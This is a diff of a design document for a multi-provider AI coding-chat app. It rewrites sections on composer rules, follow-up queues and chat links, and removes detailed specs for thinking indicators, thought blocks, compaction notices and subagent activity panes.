+- A submit reads through the field handle, because React's copy can lag a keystroke.
+- The placeholder is CSS, because CodeMirror's widget left a stray caret in WebKit.
 
-Appearance → **Celebrate PR milestones** is off by default. When enabled, a confirmed PR creation or merge sends one full-width sweep of accent pixels along the bottom of the chat. Ordinary completed turns do not animate.
+Other composer rules:
 
-`usePrMilestone` reads the workspace's GitHub PR number, state, and source timestamps. It only celebrates milestones newer than the current chat/branch watch start. Existing PRs discovered after a delayed refresh, historical merges, branch navigation, and enabling the setting do not replay old celebrations. If a refresh discovers both creation and merge, only the merge plays. Each milestone plays once while the chat remains mounted. The canvas sits outside the transcript scroller, so it also plays while the chat is empty or waiting for assistant output.
+- **The project chip is the source of truth while composing.** A dashboard delta must not retarget the picker. The launcher subscribes to project preference changes independently of dashboard selection.
+- **Early stop.** Stopping within ten seconds of launch restores the prompt and archives the workspace ([earlyStop.ts](../src/renderer/lib/earlyStop.ts)).
+- **Autofocus belongs to the active pane.** Background mounts and send completions cannot claim focus.
+- **Escape** is optional for stopping a chat. Menus and panels consume it first, so one press closes one surface.
+- **A failed launcher action** uses the shared toast and keeps the draft.
 
-The GitHub poller supplies these confirmations, including PRs created by agents through `gh`. The animation may wait until the next PR refresh. It never uses assistant prose or a turn's success state as evidence. Reduced motion and hidden documents skip the sweep.
+### Cloud launches
 
-### Error events and log dumps
+The launcher's Local / Cloud chip and `/cloud` start a hosted task. They start no local agent, and the result links to the hosted task without claiming it was saved to a local chat. A launch that may have created a task without returning a link offers no resend. See [providers.md](providers.md#cloud-tasks).
 
-Stderr and other `error` timeline events render as [LogBlock.tsx](../src/renderer/components/LogBlock.tsx), not an assistant bubble: the same `--tool-block-surface` fill as an expanded tool payload, labelled Error, with rose on the failure text. Consecutive error events coalesce into one block. Failed tool details show both the error and any distinct diagnostic output, with the usual output expansion controls.
+### Follow-up queue
 
-The kind is a claim about the row, so a notice is no longer written as one. Backend lines that merely report — the after-turn notes above — go in as `session.note` and read as notices; `error` is reserved for something that actually failed. Rows written before that split keep their `error` kind and still render rose, `operation` payload and all.
+Enter queues while an agent runs.
 
-Tracing-style records that leak into assistant markdown (`2026-09-01T07:21:37Z ERROR crate::module: ...`) lift out of the paragraph into the same block. Concatenated records split on the next timestamp, and trailing `key="value"` fields wrap onto their own line so a long `session_id` does not glue two records together. Detection lives in [logDump.ts](../src/renderer/lib/logDump.ts). A date in ordinary prose is not a log. MCP HTTP client crates (`rmcp::`, `codex_rmcp_client::`) are dropped: those lines are session-teardown noise, not a failure the chat can act on. So is `codex_core::util: Custom tool call output is missing`, which Codex logs after a cancelled in-flight custom tool. So is `codex_core::tools::router` apply_patch verification, including the expected-context lines that follow on the PTY. Those records are tool bookkeeping, not a session failure. Codex login errors still show because they use a different crate path. The normalizer classifies tracing-format raw PTY lines the same way so they are not stored as `message.delta`.
+- A row bound for another provider is never steered, and the chat switches when the turn ends.
+- Steer needs matching provider, model, and effort, on Codex, Claude, or OpenCode.
+- Codex steering is withheld near a compaction (`CODEX_STEER_MAX_CONTEXT_PERCENT`) and during one. `turn/steer` is acknowledged during the rewrite and then dropped, so the row would show as delivered and never be answered.
+- A failed delivery stays queued and may show `Delivery uncertain`.
 
-Older Codex sessions may contain `codex_app_server::bespoke_event_handling`
-errors saying Argmax did not support `mcpServer/elicitation/request`. Those are
-also hidden: the associated MCP tool row already carries the actionable failure,
-and current hosts decline an elicitation they cannot render without generating
-the protocol error.
+A suggested follow-up comes from `session:suggest-follow-up`, once per completed turn, on the title model. It is cached in `ui_state`, so reopening a chat does not boot the helper CLI again.
 
-The same historical filter covers the complete backend housekeeping list: MCP
-startup and teardown, plugin and skill cache refresh, model-cache refresh,
-WebSocket-to-HTTPS fallback, retry progress beginning with `Reconnecting...`,
-and skill-budget advisories. These rows either have an actionable tool result
-or recover on their own. Authentication failures, exhausted retries, storage
-errors, provider limits, and session persistence failures remain visible.
+### Drafts and annotations
 
-## Thinking Indicators and Thought Blocks
+[composerDrafts.ts](../src/renderer/lib/composerDrafts.ts) stores drafts in `localStorage`, stamped with a version. An entry from a newer build is skipped and left untouched. A send drops the stored entry at once, so the next New chat cannot restore a prompt that already launched.
 
-### Pre-Answer Thinking Indicator
-The animated thinking indicator displays during inactive periods while a session is running:
-- **Providers disagree on how long a call takes, so the beat does not wait for one.** Median `command.started` → `command.completed` over a week of this app's own log: OpenCode 0ms, Grok 4ms, Codex 54ms, Cursor 252ms, Claude 610ms. Three of the five report a call atomically, so keying the live line on a *running* call left their tool lines dead and the Thinking cue owning every gap. The line that just did the work keeps the beat until the cue's adaptive wait elapses ([activityBeat.ts](../src/renderer/lib/activityBeat.ts); the iPhone decides it in [TranscriptThinkingLabel.swift](../ios/Argmax/Sources/Transcript/TranscriptThinkingLabel.swift) and threads it through the `activityBeat` environment key); exactly one line is live on every provider.
-- **The desktop Thinking cue uses the selected activity mark.** Settings → Appearance → Activity mark selects its motion. The word and elapsed seconds stay still. A fixed-width slot prevents a style change from moving the label.
-- **Other running work is marked on the words.** A running group's headline, a running row's verb and target, and a live subagent launch or multitask row carry the reading wave ([reading-wave.css](../src/renderer/styles/reading-wave.css), [readingWave.ts](../src/renderer/lib/readingWave.ts)): a soft band of ink tinted with the accent reads the line left to right at a constant 7.15em/s and rests 0.4s between passes. The iPhone draws the same band and runs the same pacing ([ReadingWave.swift](../ios/Argmax/Sources/Design/ReadingWave.swift), [TranscriptThinkingLabel.swift](../ios/Argmax/Sources/Transcript/TranscriptThinkingLabel.swift)); the tuning is in [docs/design/live-text-motion](design/live-text-motion/README.md). The phase comes from the wall clock, so a remount or a headline change never restarts the pass, and elapsed seconds stay still. Under Reduce Motion the words are plain text.
-- **Suppressed when:** `session.state !== "running"`, answer text is streaming (a `message.delta` *without* `thinking: true`), a visible top-level tool is executing, or an interactive card is awaiting user input.
-- **Only a row the reader can watch counts as progress.** A subagent's own calls (those carrying a `parent_tool_use_id`) never suppress it, and neither does the launch row of a backgrounded agent — Claude answers an async `Agent` in about 100 ms with a receipt rather than a result, and the row is re-marked running to say the child is still out there. No completion for it ever arrives, since the child reports back as a `<task-notification>` prompt the normalizer does not parse, so counting it as an executing tool silenced the cue for the whole rest of the session, later turns included. `backgroundLaunch` on the `ToolCall` ([toolCalls.ts](../src/renderer/lib/toolCalls.ts)) marks those rows; they keep their nest and lose their vote.
-- **The pre-answer window is a floor, not another case.** Between a send and the provider's first visible event the indicator shows once its 600 ms wait is up and consults none of the rules above. Every one of them exists to stop this line doubling up with another live cue, and before the provider has spoken there is none on screen to double up with — so weighing them there only created ways for the pane to sit silent through the ten to thirty seconds a relaunched provider takes to answer. A stranded `session.compacting` marker, left by an app quit mid-compaction, used to silence it for the rest of the session.
-- **One cue per beat:** reasoning arrives as a `message.delta` too, so `liveThoughtOwnsProgress` in [sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts) decides which element carries progress and both consumers read it. While the newest thing the turn has produced is reasoning, and no tool started after it, the Thought block owns the beat (labelled "Thinking") and this indicator stays down. Answer text or a tool after it makes it quiet history, and the indicator or the tool line takes over. Narration *earlier* in the turn does not disqualify it: the old rule ("any answer text in the turn") meant a thought after "I'll look at the code…" never read as live, and Claude, Cursor and Grok narrate before almost every burst, so Steps' preview never appeared. Grok alternates tiny thinking/text pairs, so its cue moves between the two; each move is a real change of state. A tool stamped in the same instant as the reasoning counts as after it, because a Claude envelope carries both. Counting reasoning as streaming answer text used to leave a running turn with no cue at all for as long as the model kept reasoning.
-- **Timers:** A turn start waits 600 ms; a mid-turn silent gap has to clear the turn's own rhythm — 0.8× the median gap between significant events so far, clamped to 900–2500 ms, and 1000 ms until the turn has shown a gap to measure. A turn whose tool calls land a second apart therefore never gets a word between two of them, while a turn that genuinely stalls still does. There is no minimum visible window: the cue comes down on the same commit as whatever supersedes it, because holding it on top of a running tool line for half a second *was* the flash. All of these waits and the 1800 ms window below count from the beat's own start — the last significant event's `createdAt`, or the send that opened a turn — not from the pane's mount: a session reopened mid-turn serves only what is left of the delay, which is usually nothing, so switching back to a running chat shows the cue at once instead of replaying a wait it already sat through. The rules and the measurements behind these numbers are in [docs/design/live-activity-timing](design/live-activity-timing/README.md).
-- **Soft edges, and only where they belong.** The line fades in over 160 ms. It fades *out* over 140 ms only when a tool line takes the beat — a hand-off between two lines of the same size and weight — and it stays mounted for those 140 ms with `data-leaving="true"` so it has frames to fade in. Answer text and a settled turn cut instead: they are the frame the reader has been waiting for, and a dissolve there would put a fade on exactly that frame. A leaving line drops its `aria-label` and live region the moment it stops owning the beat, so nothing announces two live lines at once.
-- **A finished message owns its beat for 1800 ms.** The text is the progress cue for that window, so a `message.completed` takes the indicator *down* whether or not it was already up, and it only claims the next silent gap once the window is spent. Suppressing at the source is what makes this provider-shaped: Codex and OpenCode deliver an answer as one atomic `message.completed` with no answer deltas, so nothing later arrived to hide a label already up from the reasoning gap before it, and it sat under the finished answer until `session.state` flipped — roughly a second later, since that flip waits for the provider process to exit. Delaying only the first show fixed the flicker for Claude and Cursor, which stream deltas up to their completion, and left the other two showing a tail.
-- **Turn starts on send:** `SessionConversation` marks turn start on `onSendSessionInput` rather than waiting for backend state flips, preventing empty chat delays during provider spawn. The baseline records the session's state at send time, because a relaunching follow-up is sent *from* a terminal state: reading a session that is already `failed` — an orphan the app adopted back after a restart — as a turn that cannot start dropped the cue half a second after the send. Only a terminal state the session falls into *after* the send ends the beat.
-- **The wait names its own length.** Past three seconds the label grows an elapsed count ("Distilling 14s"), driven by the shared [liveTimer](../src/renderer/lib/liveTimer.ts) rather than React state so the number stays with paint while the chat reconciles. It counts from the moment the label mounted, which is the honest figure — how long *this* silent beat has had nothing to show, not how long the turn has run — and a static word is what makes a twenty-second relaunch read as a frozen pane.
-- **Transitions are logged.** Each time the cue appears or disappears, `recordChatCue` writes a breadcrumb naming the rule that holds it down; read them in Debug → Logs under scope `renderer::chat`. See [debugging.md](debugging.md).
+A window capture goes to the composer in use, never a hidden pane ([windowSnapshotInbox.ts](../src/renderer/lib/windowSnapshotInbox.ts)).
 
-### Extended-Thinking (Thought Blocks)
-Model reasoning traces (`content: "thinking"` in the canonical timeline event from Claude thinking deltas, Codex reasoning, or Cursor stream events) are routed to [ThoughtBlock.tsx](../src/renderer/components/ThoughtBlock.tsx):
-- **Live streaming:** the block that owns the beat is labelled "Thinking". Steps shows a muted plain-text preview of its latest 600 characters, capped at three lines, with a disclosure for the full reasoning. Older and settled blocks collapse to their header, which keeps the reasoning's first line as a muted excerpt so a folded thought still says what it was about. Minimal names a live thought without expanding it; the block leaves the turn once the next step lands. Detailed keeps full reasoning inline with a persistent "Thought" heading and duration when available. Replies and questions remain fully visible in both levels.
-- **One burst at a time.** A tool boundary flushes the thinking buffer into a fresh group, so a turn that reasons between calls without narrating holds one group per call — hundreds of them for a model like Gemini through Cursor. Read turn-wide, `live` opened all of them: replaying one such session put 114k characters of reasoning on screen across 131 expanded blocks, against 262 characters in one block after. `liveThoughtOwnsProgress` still decides whether the turn's reasoning owns the beat at all; `lastThinkingGroupId` ([sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts)) decides which block carries it. Everything behind the newest burst is settled history and folds to its `Thought 12s` header. Claude reaches the same shape by narrating before each tool; this is what gets a silent reasoner there too.
-- **Hold open on scroll:** In collapsed display mode, `holdOpen` keeps the newest burst expanded while it is the newest turn, so the answer lands under an open block instead of moving a bottom-pinned viewport by the block's whole height. It is keyed on that group rather than on `live`, because the hold has to outlast live. Steps never auto-expands full reasoning, so it needs no hold. Explicit expansion stays under the reader's control.
-- **Persistence:** [snapshot.ts](../src/renderer/lib/snapshot.ts) and [sessionConversationModel.ts](../src/renderer/lib/sessionConversationModel.ts) preserve thinking deltas during event pruning.
-- **Codex summary boundaries:** the app-server translator separates streamed reasoning parts and does not replay a completed item already streamed. Each live summary is a `**Header**` fragment; joining those without a break collapses the delimiters into `****` and the Thought block reads as one run-on line. `appendThinking` opens a paragraph at that seam (and splits a fragment that already arrived glued), matching the iPhone projection. Historical items whose summary parts were concatenated without separators are corrected during desktop replay when the completed summary matches that saved suffix, ignoring the paragraph breaks already inserted.
+Selection annotations and diff notes serialize in [composerAnnotations.ts](../src/renderer/lib/composerAnnotations.ts). The `side` and `base` attributes tell the agent which code the note means.
 
-## Context Compaction & Provider Handoff
+### Chat references
 
-Compaction creates a transcript boundary, not a completed provider turn. The preceding turn keeps its active display through the quiet gap, including after `session.compacted`, until resumed output takes over or the session actually ends. User prompts and provider handoffs remain turn boundaries. A pending approval or blocking question similarly keeps the turn unfinished: its chip says **Waiting**, with no working ticker or completed-turn collapse.
+`[title](argmax://chat/<session id>?v=1&e=<event id>)` is the only copy ([composerContext.ts](../src/renderer/lib/composerContext.ts)). Drafts, queues, prompts, the clipboard, and providers all hold that string, so no side record can be lost. The id is the authority, and the title is what the chat was called when attached. A link with another version stays as visible text.
 
-- **Context compaction:** Provider compaction events (`session.compacting` / `session.compacted`) are collapsed into a single `compaction` render item by [foldConversation.ts](../src/renderer/lib/foldConversation.ts) and rendered by [CompactionNotice.tsx](../src/renderer/components/CompactionNotice.tsx) (`Compacted context · 471k → 10.7k`). Claude repeats the opening row — `system/status status:"compacting"` is a heartbeat every 30s for as long as the run takes — so the collapse folds consecutive running markers too, not just the start/end pair, and the seam keeps the first row's id. Codex brackets the same seam with `item.started` / `item.completed` on a `context_compaction` item, mapped in [normalizer/codex.rs](../src-tauri/src/providers/normalizer/codex.rs); that item carries no token counts, so its notice reads `Compacting context` and then `Compacted context` with no sizes. Synthetic summary prompts injected by the provider are dropped. A typed `/compact` reaches the same seam on every provider but Cursor: Claude and Grok run it themselves (Grok streams nothing, so [grok_acp.rs](../src-tauri/src/providers/grok_acp.rs) emits the Claude-shaped `compacting` / `compact_boundary` rows), Codex gets `thread/compact/start`, and OpenCode gets `POST /session/{id}/summarize`, whose summary text is dropped from the chat. Claude never echoes a locally run slash command, so [claude_control.rs](../src-tauri/src/providers/claude_control.rs) takes the `<local-command-stdout>` row as the echo; without that the `result` was dropped and the turn never ended. A compaction is total provider silence, so `isCompacting` only trusts an opening row that is still the newest event — a marker stranded by a Stop mid-compaction never gets its closing row, and trusting it forever suppressed the progress cue for the rest of the chat's life.
-- **Provider handoff:** Changing providers on an idle session creates a `session.provider-changed` marker rendered by [ProviderSwitchNotice.tsx](../src/renderer/components/ProviderSwitchNotice.tsx) (`Cursor → Codex · GPT-5.6 Sol`). Follow-ups restart fresh with the capped transcript.
-  Choosing **New chat** in the provider-switch dialog instead opens the full-view launcher with the selected model and carried draft, regardless of the new-chat split preference. Launching shows only the new session.
-- **Project handoff:** Moving a session creates a `session.moved` marker rendered by [ProjectMoveNotice.tsx](../src/renderer/components/ProjectMoveNotice.tsx) (`HQ → Argmax · shared checkout`). The destination starts a fresh provider conversation with the capped transcript and checkout path.
-- **Session notes:** What Argmax did to the chat itself — resuming a move or archive promised before the last quit, or dropping one the turn never earned — is a `session.note` row carrying the `operation` (`session.move`, `workspace.archive`, or `turn.input-undelivered` — a turn stopped before the model ever read its message), rendered by [SessionNote.tsx](../src/renderer/components/SessionNote.tsx) as one muted centered line. It is not a seam: nothing changed hands, so it has no rules on either side, and [foldConversation.ts](../src/renderer/lib/foldConversation.ts) lets it follow the turn it landed in rather than ending that turn and splitting one answer across two blocks. The failure that may have caused it is its own `error` row.
+The backend reads the same link as the person's grant to read that one chat ([agent-tools.md](agent-tools.md#who-may-read-whom)).
 
-## Multitask Rows
+### Background send
 
-A multitask dispatched from the composer writes `multitask.launched` into this chat and `multitask.finished` when the sibling chat's turn ends. Both fold into one notice associated with the dispatch turn, then [SessionConversation.tsx](../src/renderer/components/SessionConversation.tsx) draws it above the composer with [MultitaskRow.tsx](../src/renderer/components/MultitaskRow.tsx), one line per multitask in a tray tucked behind the input card (`Fix the changelog date  Corrected the 0.4 heading to 2026.`).
+The remappable chord (default ⌥↵) starts a chat without leaving the draft. It skips Project check, because that may open a dialog, and it refuses Cloud. If the start fails, the draft returns ([draftRestore.ts](../src/renderer/lib/draftRestore.ts)).
 
-- **It stays above the composer.** The row remains visible after the parent turn finishes and while the dispatch point scrolls away. Its content aligns with the input card, and a capped lane scrolls before repeated rows can crowd out the transcript.
-- **One row per multitask.** The finish row merges into the row the dispatch opened, keyed by child session id, while the rows keep launch order.
-- **A finished row carries one line of the answer** on the status line (`Completed · Corrected the 0.4 heading to 2026.`), markdown stripped and cut at 120 characters. The full answer stays in the dock tab.
-- **The mark names it, the words say it is live.** The mark is the emblem its dock tab uses, whatever the chat is doing, hashed off its session id the way a subagent's is hashed off its codename. A running row carries the reading wave through its title, the same live mark a subagent launch row and a running tool row carry, so the mark is free to be identity alone. The status words are the launch row's own (`Running` / `Completed` / `Failed`), plus `Stopped` — the one thing a person can do to a multitask that a subagent has no equivalent for — and they are paced like a running headline: one wording per beat, newest wins, so a chat that blocks on an approval and is answered a second later never flicks a word onto the row and off again ([pacedHeadline.ts](../src/renderer/lib/pacedHeadline.ts)).
-- **Stop rides the row**, revealed on hover or focus. It stops that chat only: the early-stop launcher restore and archive are pane behaviour and a multitask has no pane.
-- **Clicking opens the dock, not another chat.** A multitask has no sidebar row; it opens as a tab in this pane's Agents view beside the subagents, carrying its own chat. See [multitask.md](multitask.md).
+[reservedChords.ts](../src/renderer/lib/reservedChords.ts) rejects chords the app already uses. A test reads the accelerators out of [menu.rs](../src-tauri/src/menu.rs), so a new menu item cannot be missed.
 
-## Subagent Activity Panes
+### Plan usage chip
 
-Silent gaps after narration use the chat's `ThinkingLabel`, including its verb
-and live seconds counter. Reasoning updates keep the same burst start time,
-so the counter advances between trace imports without restarting on each delta.
-Live answer text, running tools, and live Thought blocks carry their own progress.
-Each resumed assignment uses its own launch time and completed runs stay quiet.
-
-Subagent tool calls (Claude `Task`/`Agent`, Codex `spawn_agent`, OpenCode `task`, Cursor `taskToolCall`/ACP `task`) display a launch row in the parent conversation via [AgentLaunchList.tsx](../src/renderer/components/AgentLaunchList.tsx), rendered as a bulleted task list:
-
-```
-✿  Map chat tool-row rendering  Noether  ›
-   Completed
-```
-
-- **Line one** leads visually with the codename, followed by the agent's own `description` in smaller, quieter type. The codename is also the label on its tab and activity pane. Names and descriptions wrap onto separate lines in narrow panes. Codenames are surnames of physicists, mathematicians and computer scientists from `agentNames.ts`, hashed from the spawn id and kept unique within a session; the first spawn always draws from the ten headline names. `agentLaunchLabel` falls back to `Launched <codename>` when the provider gave no description. The `prompt` is never promoted into the title. The state stays on a second line, and the existing details control sits at the trailing edge.
-- **Line two** is the state in words (`Completed` / `Running` / `Failed`), indented to the task rather than the bullet. This replaced the old circle-check and circle-cross glyphs: a finished agent says so, rather than encoding it in a mark.
-- **Parent exit ends unfinished native runs.** A persisted session completion, cancellation, or crash recovery after an agent start makes that unfinished run `Failed`, including after a successful provider exit. Resuming the chat does not revive it. Waiting for approval alone is not an exit, and an observed child completion keeps its own result.
-- **The mark is identity; liveness is on the words.** The mark is the agent's **emblem** from the launch, as the dock tab and the pane masthead carry it, and a row the turn is blocked on says it is live by carrying the reading wave through line one — the same treatment a running tool row's verb and target get, since the launch row *is* the transcript's live line for that delegated work (it is what keeps the Thinking cue down). A nest beside a band would mark the same thing twice.
-- **A backgrounded launch keeps the nest instead.** It is the one row marked running by inference rather than by evidence: no completion for one ever arrives, so a band reading its words for the rest of the session would claim progress the app cannot see, while a status mark says only that the child is alive somewhere else. That is also the row that does not vote for the transcript's beat (above), so the two rules agree — a backgrounded launch never takes the band, and never suppresses the cue that does. The nest (four dots, [WorkingNest.tsx](../src/renderer/components/WorkingNest.tsx)) and the emblem occupy the same box so the text edge does not shift when an agent lands.
-- **Line one's wording is paced.** Task, codename and status go through `usePacedHeadline` ([pacedHeadline.ts](../src/renderer/lib/pacedHeadline.ts)) as one wording, so parts that resolve moments apart commit together and only the part that changed fades up — the settle is the one change a launch row usually has, and it lands at once because a settled row is when the words are worth reading.
-- **The emblem is the codename's face.** `emblemForCodename` ([agentEmblems.ts](../src/renderer/lib/agentEmblems.ts)) gives each of the 100 names one of twelve radially symmetric shapes in one of the nine `--session-icon-*` hues, drawn by [AgentEmblem.tsx](../src/renderer/components/AgentEmblem.tsx). Binding it to the name rather than the spawn is what makes it worth learning: Gauss is the same mark in every session and every project, and a session's spawns are distinct for free because the codenames already are. A backgrounded agent's nest wears the same hue while it runs, so its landing ends in the colour the emblem is about to take. A failed agent keeps its shape, greys to `--muted`, and takes a small `--rose` corner dot — the hue says *who*, never *how it went*. The set and its rules live in [docs/design/agent-emblems](design/agent-emblems). The iPhone draws the same marks by the same rules ([AgentEmblem.swift](../ios/Argmax/Sources/Design/AgentEmblem.swift)): [export-ios-agent-emblems.mjs](../scripts/export-ios-agent-emblems.mjs) ports the twelve shapes, resolving their elliptical arcs to béziers so the phone needs no path parser, and the codename table with them, while the hues come from the session icon palette both screens already share and the bevel is mixed in oklab at runtime. Ported rather than re-drawn because the whole point of binding a mark to a name is that Gauss is Gauss on both screens — `AgentEmblemTests` pins the hash, the fallback name and three codenames against the renderer's.
-- **The nest lands before the emblem takes over**, on the one row that still has a nest to land. On the running → finished edge the four dots gather into one, pulse once in `--accent-deep`, and open back out to the settled 2x2. The swap waits `WORKING_NEST_SETTLE_MS` for it ([useSettleHold.ts](../src/renderer/hooks/useSettleHold.ts)) — without that hold the nest unmounts on the frame it would have started settling, which is why the settled state was unreachable in the shipped app until the hook existed. The hook catches the flip *during render*, not in an effect: an effect runs after the commit, so the bullet would already have painted once and taken the nest with it. An agent that errored skips the landing entirely, and so does a mark that mounts already finished — a landing means "this just happened".
-- **Missing Codex launches recover from lineage.** If structured stdout omits `spawn_agent`, the child trace can supply its parent conversation ID. Argmax inserts one deterministic launch row and imports the child activity beneath it. A later real launch reparents the child rows and sends cursor-visible tombstones for the synthetic pair, so an open chat removes the placeholder without showing a duplicate.
-- **Grok children are imported from disk.** The parent stream only carries the `spawn_subagent` receipt, so the pane used to open on that JSON envelope and an empty-state notice. The child's `chat_history.jsonl` is the activity; the receipt is hidden as launch metadata.
-- **Claude's SendMessage resume is the same kind of receipt.** The tool result is `{"success":true,"resumedAgentId":…,"pin":…}`, not the child's answer. It is hidden as launch metadata so the dock does not paint that JSON in the result panel while the resumed run is still working. Codex `resume_agent` never reaches the pane: it is transport, folded away with `wait` / `close_agent`. A visualization would be provider-shaped ids the reader already has as the running agent.
-- **Spacing** is deliberately looser than the tool rows (`gap: 14px`): delegated work is the coarsest thing in a turn.
-
-Clicking the text opens the activity pane; the trailing chevron expands the raw tool detail inline. The button hugs its text so that chevron sits beside the task instead of against the far edge. That detail follows the *row* level, not the group level — it opens by default from Detailed up, so Steps keeps the launch a two-line row. What the chevron reveals is the launch receipt, which for a backgrounded agent is a wall of internal instructions to the parent, and the delegated work itself lives one click away in the pane.
-
-- **The right dock, not a grid column:** Clicking the row opens the subagent in that session's review panel — a third mode beside Changes and Files ([AgentsView.tsx](../src/renderer/components/AgentsView.tsx)), so delegated work reads next to the work it came from. The transcript itself is [AgentActivity.tsx](../src/renderer/components/AgentActivity.tsx) and carries no chrome of its own. Every discovered pane stays mounted, so a backgrounded subagent keeps polling. The strip is lifecycle-managed rather than manually closable: it holds the selected entry plus running and failed work, as many as the strip's width fits, from two in a narrow dock to seven in a wide one. Past that cap the selection changes *membership* rather than order — the slots go to the selection, then failures, then the newest work, and the survivors are still drawn in launch order, so switching tabs shifts at most the one entry that had to make room. `+N active` and the fixed `All agents N` control open the same full roster. A subagent's tab is marked with its emblem at 13px, and so is a multitask's — hashed off the session id rather than a codename, since a multitask has none. Split is left for the one case with no session id yet: a multitask dispatched but not yet launched. The pane opens on a fixed masthead: the task the agent was given as the title, and one muted line with its codename, role, and reported model and effort (`Gauss · Reviewer · Opus 5 · Extra High`). The masthead keeps the agent's emblem at 18px in a tile tinted from the same hue. The tab and launch row carry the live working mark. Under it the run opens on one band: the brief's "Instructions" chip on the left, the turn's "Working for"/"Worked for" chip pinned right, and the header hairline running between them (`TurnBlock`'s `brief` prop puts the two controls on one row rather than stacking two rules). The brief itself shows by default as a quotation — a left rule and muted `--text-sm` prose, no panel — capped at nine lines with a one-line fade and a `Show all (N more lines)` control; while clipped the quote itself lifts the cap. The "Instructions" chip folds it away entirely. A tab whose launch row leaves the timeline (a superseded Codex spawn) is dropped. A surface without that dock hands the rows no handler at all: on the phone the launch row keeps its mark, name and status and stops being a control, since a press had nowhere to land ([remote.md](remote.md)).
-- **Opening Agents discovers the session's work.** Opening the right panel with ⌘B and choosing Agents populates the same subagent and multitask roster as the workspace card. The roster groups Running, Failed, and Completed, with the newest lifecycle transition first inside each group; typing filters by task or codename. The strip itself is ordered by launch, oldest leftmost, and selecting a tab never moves it: a tab's place is a property of the agent, not of where the reader is looking. Completed work leaves the strip once it is no longer selected but remains in the roster. New arrivals never steal selection. A native continuation is a new assignment in the same durable entry: a completed agent moves back to Running, keeps its codename and emblem, and reuses the pane that already contains its earlier runs. The Agents mode count reports running work, while `All agents N` reports the whole roster.
-- **A subagent run is one turn, read at the chat's own verbosity.** The pane attaches child tools with `foldTurnToolItems`, interleaves individual calls with prose, then uses the same ordered activity projection as the transcript in Compact and the tool-only fold at other levels, and wraps them in the same [TurnBlock.tsx](../src/renderer/components/TurnBlock.tsx): the `Worked for Xs` chip is one control over every activity disclosure below it. Where it starts comes from the chat-verbosity setting, not from a separate one — a pane that opened wide while the chat beside it read as single lines was two settings for one reader. The run is always its pane's latest turn, so it never collapses on age the way an older chat turn does. At Minimal the pane keeps only its result panel until the chip is opened, and unlike a chat turn it hides *all* pre-tool narration: the run's answer is the result panel, so there is no last prose group standing in for one. Claude native `SendMessage` continuations appear as separate runs in the same stable dock tab. `task_started` and `task_notification` identify the run lifecycle, while the message delivered to the parent remains its own event.
-- **Native Claude, Codex, OpenCode, and Cursor identity is parent-scoped.** A dock reference resolves only when its parent native conversation id and child session id match the current conversation. Clearing, switching provider, or forking invalidates inherited resumability, even though the old timeline rows remain readable history. References use the current parent-mediated follow-up, so the child does not become an independent session. Codex assignments start with `spawn_agent` or `send_input`. OpenCode continuations call `task` with the existing `task_id`. Cursor continuations use the authoritative `agentId` from the completed ACP `task` result; Composer 2.5 is excluded from this path. Delivery and `pending_init` do not complete an assignment. Its terminal child state does.
-- **Independent sessions stay independent.** An ordinary session launched from the app keeps its own session and dock behavior. The persistent multi-run behavior applies to native Claude, Codex, OpenCode, and Cursor children. OpenCode exposes the child result in the parent tool row, without a separate child trace stream.
-- **Inputs to a busy Codex child stay in its active assignment.** A follow-up after completion opens a new run. Delivering more instructions while the child is active does not create another running entry.
-- **Run metadata:** Each run shows the newest model and effort reported for its own native child and invocation. Continuing an agent or reusing a tool id cannot change another run's header.
-- **Trace imports:** `session:agent-events` fetches and parses trace files on demand. Parsed rows are saved with deterministic IDs (`trace:<provider>:<sessionId>:<parentToolUseId>:<childId>:<seq>:<kind>`) and hidden from the main chat view. A failed import shows an alert even while the agent is running. A successful retry clears it.
-
-## Chat Verbosity & Single-Line Activity Mode
-
-Configured in Settings → Agents ("Chat detail & verbosity"): a **1–4 scale** (**Minimal / Compact / Steps / Detailed**). Compact is the default when no preference is saved. Saved levels 1–4 keep their numeric value. The removed Full trace level 5 and legacy expanded-thinking preferences migrate to Detailed. Level 3 was called Balanced until 2026-09-19; the stored value did not change, and the legacy "collapsed calls + expanded groups" pair that already migrated to 3 is exactly what Steps now resolves to. The phone's Settings → Chat detail uses the same four levels and names ([MobileChatDetail.swift](../ios/Argmax/Sources/Design/MobileChatDetail.swift)), on its own device-local key — two devices, two preferences, and the Settings row says so.
-
-**Minimal means less on the phone than it does on the desktop.** There is no per-turn `Worked for` chip in the native app, so a finished turn never folds its work away; Minimal differs from Compact by folding the remarks before each call and by showing one group icon instead of three. Its hint says only what it does. The chip is the piece that would close the gap, and it is not a row-level addition: `MobileTranscriptRow.rows` is flat over the whole transcript with no turn segmentation, per-row `@State expanded` would have to move up to the turn, and `TranscriptRowWindow` pages and anchors by row id. Until then the phone's Minimal is the honest version of itself rather than a half-built copy of the desktop's.
-
-Everything else the desktop does at each level, the phone mirrors: the narration fold and its `isProgressNarration` predicate (matched to the JS one down to the UTF-16 length cap, the blank-line class, and `[0-9]` over ICU's Unicode-aware `\d`), the settled-thought fold, the live reasoning cue, and the rule that a run of nothing but reasoning keeps the thought's own disclosure rather than nesting it in an outer group. The fold is only built for a settled turn — a live turn keeps its narration on screen, as on the desktop, because folding it mid-read swallowed a sentence and moved the activity row's id, which rebuilt the row and dropped its scroll anchor.
-
-Each level adds one thing to the one below, so the four read as steps rather than as four unrelated styles: Minimal drops finished work, Compact keeps one summary per stretch of work, Steps names every call, Detailed opens them.
-
-Every level starts from the same chronological activity. `foldConversationItems` carries individual messages and tools, and `foldTurnToolItems` attaches subagent children. The renderer interleaves those calls with prose, cards, and agent launches before folding routine work for display. In Compact, provider reasoning is an activity member alongside reads, searches, edits, and commands, so a `Thought → tool → Thought → tool` sequence becomes one disclosure instead of alternating rows. The run ends at visible prose, steering, cards, errors, or an agent launch. An agent launch is never one of them: at every level, Compact included, it keeps its own row and ends the run. A summary line reading "started an agent" hid the launch row that names the delegated work, carries the codename and emblem, and opens the subagent's pane, leaving a whole child agent to read like a file read. Hidden Minimal narration remains a grouping boundary so collapsing a turn cannot combine work from separate parts of the conversation.
-
-A Compact run containing only reasoning uses the thought's own disclosure, collapsed by default even while live. An outer activity disclosure is added once the run contains tools, avoiding a nested `Thought → Thought` control.
-
